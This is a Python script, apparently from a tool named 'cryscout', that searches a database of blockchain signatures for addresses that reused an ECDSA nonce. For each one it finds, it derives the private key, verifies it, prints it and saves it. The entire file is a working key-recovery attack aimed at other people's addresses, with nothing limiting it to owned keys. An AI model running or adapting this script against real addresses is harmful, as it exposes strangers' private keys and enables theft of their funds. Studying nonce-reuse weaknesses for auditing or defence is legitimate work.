import sqlite3
from lattice_nonce_analyzer import verify_key
from db_manager import add_recovered_key, add_finding

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_all_r_reuse():
    conn = sqlite3.connect('cryscout.db')
    cursor = conn.cursor()
    
    # Get all R values reused by the same address
    cursor.execute('''
        SELECT r_hex, address, COUNT(*) 
        FROM signatures 
        GROUP BY r_hex, address 
        HAVING COUNT(*) > 1
    ''')
    reused = cursor.fetchall()
    
    print(f"Found {len(reused)} R-reuses in the database.")
    
    found_keys = 0
    for r_hex, address, count in reused:
        if r_hex is None or r_hex == 'None': continue
        
        cursor.execute('''
            SELECT s_int, z_int, txid 
            FROM signatures 
            WHERE r_hex = ? AND address = ?
        ''', (r_hex, address))
        sigs = cursor.fetchall()
        
        for i in range(len(sigs)):
            for j in range(i + 1, len(sigs)):
                s1, z1, tx1 = int(sigs[i][0]), int(sigs[i][1]), sigs[i][2]
                s2, z2, tx2 = int(sigs[j][0]), int(sigs[j][1]), sigs[j][2]
                
                if z1 == z2:
                    continue # Same message, not exploitable
                
                # R-reuse formula
                r = int(r_hex, 16)
                for s_diff in [(s1 - s2) % P, (s1 + s2) % P]:
                    if s_diff == 0: continue
                    k = ((z1 - z2) * pow(s_diff, -1, P)) % P
                    d = ((s1 * k - z1) * pow(r, -1, P)) % P
                    
                    if verify_key(d, address):
                        d_hex = hex(d)[2:].zfill(64)
                        print(f"!!! KEY RECOVERED for {address} !!!")
                        print(f"  R: {r_hex}")
                        print(f"  TX1: {tx1}")
                        print(f"  TX2: {tx2}")
                        print(f"  Private Key: {d_hex}")
                        add_recovered_key(address, d_hex, method='R-Reuse (Database Scan)')
                        add_finding(address, 'R-Reuse (Solved)', txid=tx1, details={'r': r_hex, 'priv': d_hex}, severity='Critical')
                        found_keys += 1
                        break
                    
                    # Try negative d
                    d_neg = (P - d) % P
                    if verify_key(d_neg, address):
                        d_hex = hex(d_neg)[2:].zfill(64)
                        print(f"!!! KEY RECOVERED (neg) for {address} !!!")
                        add_recovered_key(address, d_hex, method='R-Reuse (Database Scan)')
                        found_keys += 1
                        break
    
    conn.close()
    print(f"Finished scan. Total keys found: {found_keys}")

if __name__ == "__main__":
    solve_all_r_reuse()
